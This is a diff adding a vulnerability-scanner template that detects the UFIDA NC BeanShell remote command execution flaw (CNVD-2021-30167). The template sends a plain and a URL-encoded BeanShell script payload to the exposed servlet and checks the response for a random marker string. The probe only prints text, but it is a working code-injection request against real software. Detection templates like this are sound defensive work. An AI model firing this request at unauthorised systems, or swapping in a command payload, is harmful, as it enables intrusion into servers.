@@ -1,0 +1,45 @@
+http:
+    - raw:
+        - |
+          POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          bsh.script=print%28%22{{randstr}}%22%29%3B
+    - matchers:
+        - type: word
+          words:
+            - BeanShell Test Servlet
+        - type: word
+          words:
+            - '{{randstr}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          %62%73%68%2e%73%63%72%69%70%74=%70%72%69%6e%74%28%22{{randstr}}%22%29%3b
+id: CNVD-2021-30167
+info:
+    author: pikpikcu,SleepingBag945
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.
+    name: UFIDA NC BeanShell Remote Command Execution
+    reference:
+        - https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A
+        - https://www.cnvd.org.cn/webinfo/show/6491
+        - https://chowdera.com/2022/03/202203110138271510.html
+    severity: critical
+    tags:
+        - beanshell
+        - yonyou
+        - SHS
+        - Servlet
